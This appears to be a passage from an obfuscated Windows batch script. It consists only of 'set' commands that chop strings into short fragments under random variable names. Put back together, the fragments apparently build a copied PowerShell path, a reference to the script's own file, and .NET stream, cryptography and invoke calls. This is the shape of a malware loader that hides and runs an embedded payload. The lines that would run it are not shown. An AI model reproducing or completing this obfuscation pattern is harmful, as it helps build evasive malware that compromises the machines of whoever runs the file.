@echo off
set "FEUDePJgvr=em"
set "gqwvfDhlnH=he"
set "EQLOgFmXab= C"
set "UkcTngKKUC=Sy"
set "JxmpLqReLC= /"
set "wvmnNAspqS=ws"
set "cYDUuXSmKN=s\"
set "FMaujoOFgM=.e"
set "wDoDOqlBNL=do"
set "QelFnmyEau=\W"
set "ZNKTSsCziA=ll"
set "hysDINjRaG=xe"
set "NOEZliDImC=32"
set "dFmfjRIAXb=we"
set "qfgaxtrxRU=Po"
set "GGYydtKbVg=Wi"
set "tLAjifemem=:\"
set "mopqxglIha=py"
set "PBCuWonXvG=0\"
set "TuwgiqqzPy=in"
set "pgPPJjoxlf=ll"
set "VJSrXtpblQ=y "
set "wGUvLjgdwC=rs"
set "bXQoYxhjtH=rS"
set "LJytQtoRba=\v"
set "SeTNfmPIQW=we"
set "sGCzIAOghr=ow"
set "wMdTKEDCBc=co"
set "VIaSWoCPgP=po"
set "OnbQpGaoMf=nd"
set "YbiXirxofv=he"
set "liejWRVVEN=1."
set "ePAYUZeyPD=st"
set "LfctlteQvS= %~dp0"
set "RnNnQOWNrS=cd"
set "CDzTTDwwqI=y.Ci"
set "zIQuNkrFnH=eam("
set "cSXtSFnifV=.Cre"
set "kRVKqHqqUq=qnb."
set "fgWaaJCmhH=hy.A"
set "CwHcXKujIr=ay()"
set "NtQftrnpaY=.IO."
set "ixKLZawvgU=('da"
set "DWwOCNeXgY=('%~f0'"
set "WKJPEZphCF=ionM"
set "QkVsgdOHUX=orF'"
set "AAdCdqEvXk=se()"
set "gcHIxNoXJt=m(, "
set "TucLVcyDet=pose"
set "PXbEraiXaE=V = "
set "nFetKCsxKh=e = "
set "dXVOTuRrSe=bstr"
set "qGYevubxcN=P.Pa"
set "MPuVIMAHaH=7;$N"
set "cPuHPIYXmA=Invo"
set "vOTCzrUxiW=YxVw"
set "gugnrZrVNL=Secu"
set "ckcAueTHKS=)))"
set "ahMdDnAmSw=();$"
set "tzBxIOKfDD=and "
set "AwyRdNQgTc=('%*'"
set "ddfJlPXuPj=qnb "
set "aAjzDAifGv=ect "
set "BKcEzUDzbK=ose("
set "EeUffNNswM=.Dis"
set "bqCyYOaTYf=$Rhg"
